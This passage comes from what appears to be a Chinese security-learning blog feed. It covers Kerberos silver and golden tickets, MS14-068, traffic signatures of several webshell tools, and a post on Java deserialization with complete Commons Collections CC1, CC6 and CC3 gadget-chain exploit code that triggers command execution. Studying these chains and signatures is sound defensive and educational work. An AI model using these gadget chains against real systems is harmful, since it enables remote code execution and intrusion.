入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p><p>​    AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p><p>​    TGS（Ticket Granting Server）= 票据授权服务器</p><p>​    SS（Service Server）= 特定服务提供端</p><h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>前提：</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket=Server Hash(Server Session Key+Client info+End Time) </span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造</p><h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>前提：</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><p><a href="https://blog.csdn.net/weixin_43171033/article/details/115933240">资料</a></p><p><a href="https://www.freebuf.com/articles/web/291655.html">资料</a></p><h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>成因：</p><p>KDC（密钥分发）对PAC进行验证时，对于PAC尾部的签名算法，虽然原理上规定必须是带有Key的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。因此伪造的任意内容都可以是合法的，直接加上内容的MD5值作为签名即可（第一个原因）</p><p> PAC没有被放在TGT中，放在其它地方。KDC在仍然能够正确解析出没有放在TGT中的PAC信息PAC必须是密文，经过Key加密的KDC会从Authenticator中取出来subkey，把PAC信息解密并利用客户端设定的签名算法验证签名（第二个原因）</p><p>KDC验证缺少PAC的TGT成功后，再验证不在TGT中 的PAC的合法性。如果2个均验证成功，KDC把PAC中的User SID、Group SID取出来，重新使用进行签名，签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样。将将新产生的PAC加入到解密后的TGT中，再重新加密制作全新的TGT发送给Client，不是TGS（第三个原因）</p><p><a href="https://www.cnblogs.com/feizianquan/p/11760564.html#autoid-5-0-0">资料</a></p><h2 id="webshell流量分析"><a href="#webshell流量分析" class="headerlink" title="webshell流量分析"></a>webshell流量分析</h2><h4 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h4><p>静态特征： 一句话木马</p><p>动态特征：</p><blockquote><p>请求包中：</p><p>ua头为百度爬虫</p><p>请求体中存在eavl，base64等特征字符</p><p>请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p><p>请求体中执行结果响应为明文</p></blockquote><h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><p><strong>默认编码连接时</strong></p><p>这里我们直接使用菜刀的一句话webshell</p><p>每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且存在base64等字符</p><p>响应包的结果返回格式为 随机数 结果 随机数</p><p><strong>使用base64编码器和解码器时</strong></p><p>蚁剑会随机生成一个参数传入base64编码后的代码，密码参数的值是通过POST获取随机参数的值然后进行base64解码后使用eval执行</p><p>响应包的结果返回格式为 随机数 编码后的结果 随机数</p><h4 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h4><p>采用采用预共享密钥，密钥格式为md5(“admin”)[0:16], 所以在各种语言的webshell中都会存在16位数的连接密码，默认变量为k。</p><p>在PHP中会判断是否开启openssl采用不同的加密算法，在代码中同样会存在eval或assert等字符特征</p><p>在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</p><p>在aps中会在for循环进行一段异或处理</p><h5 id="冰蝎2-0-webshell木马动态特征"><a href="#冰蝎2-0-webshell木马动态特征" class="headerlink" title="冰蝎2.0 webshell木马动态特征"></a>冰蝎2.0 webshell木马动态特征</h5><p>在了解冰蝎3.0之前，先看看2.0是怎么交互等</p><p>2.0中采用协商密钥机制。第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</p><p>Accept: text/html, image/gif, image/jpeg, *; q=.2, <em>/</em>; q=.2</p><p>建立连接后 所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/；</p><h5 id="冰蝎3-0-webshell木马动态特征"><a href="#冰蝎3-0-webshell木马动态特征" class="headerlink" title="冰蝎3.0 webshell木马动态特征"></a>冰蝎3.0 webshell木马动态特征</h5><p>在3.0中改了，去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密钥格式为md5(“admin”)[0:16],但还是会存在一些特征</p><p>在使用命令执行功能时，请求包中content-length 为5740或5720（可能会根据Java版本而改变）</p><p>每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache</p><p>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9</p><h4 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h4><p>哥斯拉webshell静态特征</p><p>选择默认脚本编码生成的情况下，jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征</p><p>php，asp则为普通的一句话木马</p><h5 id="哥斯拉webshell动态特征"><a href="#哥斯拉webshell动态特征" class="headerlink" title="哥斯拉webshell动态特征"></a>哥斯拉webshell动态特征</h5><p>所有请求中Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</p><p>所有响应中Cache-Control: no-store, no-cache, must-revalidate,</p><p>以上两个只能作为弱特征参考</p><p>同时在所有请求中Cookie中后面都存在；特征</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化学习（二）</title>
      <link href="/2022/06/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/06/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><p>1、接受任意对象</p><p>2、执行readObject方法</p><p>java反序列化调用时一定会调用readObject方法，由于readObject是可以重写的，然后我们通过传递一些危险的对象从而调用危险的方法</p><p>可以利用不同类 的同名函数</p><p>任意方法调用（反射/动态加载字节码）</p><p>readObject()方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject()是可以重写的，可以定制反序列化的一些行为。</p><p><strong>注意</strong></p><p>入口类要可序列化，同时重写了readObject，接受任意对象作为参数</p><h2 id="cc1链"><a href="#cc1链" class="headerlink" title="cc1链"></a>cc1链</h2><p><strong>环境</strong></p><p>需要jdk-8u65</p><p>maven需要3.2.1</p><p>利用点：Transformer类；利用invoketransformer内部的Transformer类从而利用反射，实现危险函数利用。</p><p><strong>漏洞利用过程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">//        Runtime r = Runtime.getRuntime();</span><br><span class="line">//        Class runtime = Runtime.class;</span><br><span class="line">//        Method getRuntimeMethod = runtime.getMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        Runtime a = (Runtime) getRuntimeMethod.invoke(null,null);</span><br><span class="line">//        Method execMethod = runtime.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">//        execMethod.invoke(a,&quot;calc&quot;);</span><br><span class="line">//        Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="line">//        Runtime a= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(a);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Class c = Runtime.class;</span><br><span class="line">//        Method calcmethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">//        calcmethod.invoke(r,&quot;calc&quot;);</span><br><span class="line">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        hashMap.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; Map = TransformedMap.decorate(hashMap, null, chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        Object o = constructor.newInstance(Retention.class, Map);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>整体思路</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; 代码执行</span><br></pre></td></tr></table></figure></blockquote><p>由于Runtime.getRuntime.exec();无法反序列化，因此需要反射</p><p><img src="https://img-blog.csdnimg.cn/01d9bc03454b42579f6cb65c16daeaf7.png#pic_center"><br>具体情节可以参考</p><p><a href="https://su18.org/post/ysoserial-su18-2/#%E6%80%BB%E7%BB%93">cc1(1)</a></p><p><a href="https://blog.csdn.net/cjdgg/article/details/122277578">cc1(2)</a></p><p><a href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">cc1(3)</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bf5252f16d46d7c835443b27896d7f4c">cc1(4)</a></p><h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>流程：（下方那个，上方的为cc1）</p><p><img src="https://img-blog.csdnimg.cn/91153f76f8074e9d8c3f8df1829310de.png#pic_center" alt=" "></p><p>优点:不受java版本控制，任何版本的java都可以使用该链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry a = <span class="keyword">new</span> <span class="function">TiedM<span class="title">apEntry</span><span class="params">(lazyMap, <span class="string">&quot;aaa&quot;</span>)</span></span>;</span><br><span class="line">        HashMap&lt;Object, Object&gt; b = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        b.put(a, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="comment">//为了防止在序列化时就调用整个链子因此对lazyMap进行反射，令刚开开始的值不为chainedTransformer，之后通过反射在修改为chainedTransformer，从而达到在序列化时不会利用整个链子</span></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryfield = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryfield.set(lazyMap,chainedTransformer);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//使得在序列化时put调用时给lazyMap添加的值删掉</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(b);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.yongsheng.site/2022/01/26/CommonsCollections-6/">参考</a></p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>利用另一种方法  类的动态加载</p><p>在类加载时，我们需要利用、</p><p>Classloader-&gt;findClass-&gt;defineClass-&gt;Templateslmp（调用newinstance类）- &gt;getTransletInstance()</p><p>由于在Templateslmp类内部有三个方法调用，因此我们逐个分析，然后发现第三个可以较好利用</p><p><img src="https://img-blog.csdnimg.cn/9894ce67eb414e2f92b38cc9bd44a0c4.png#pic_center"></p><p>由于在第三个中存在newinstance,可以初始化</p><p><img src="https://img-blog.csdnimg.cn/c4cdce0d99fc43df9b2b67aae34412c2.png#pic_center"></p><p>因此选择这个比较合适</p><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        Field tfactoryField = tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 